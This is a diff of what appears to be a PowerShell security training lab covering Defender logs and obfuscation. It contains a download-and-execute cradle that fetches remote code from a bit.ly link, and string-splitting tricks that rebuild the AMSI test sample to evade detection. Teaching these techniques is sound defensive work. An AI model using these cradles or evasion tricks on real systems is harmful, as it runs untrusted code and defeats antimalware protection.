@@ -38,7 +38,7 @@ Get-WinEvent -ListLog *defender*
 
 Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -FilterXPath "*[System[((EventID=1116) or (EventID=1117))]]" -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
 
-iex 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c138 6'
+iex "AMSI Test Sample: $('{4}-{3}-{2}-{1}-{0}' -f '0ac1484c1386','8740','4339','861b','7e72c3ce')"
 
 ## Exercise 1.2 - PowerShell Policies
 
@@ -102,7 +102,6 @@ iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
 
 ### 1.3.2 Obfuscation
 
-# You may need to covert all quotes to straight quotes below
 iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
 
 #region
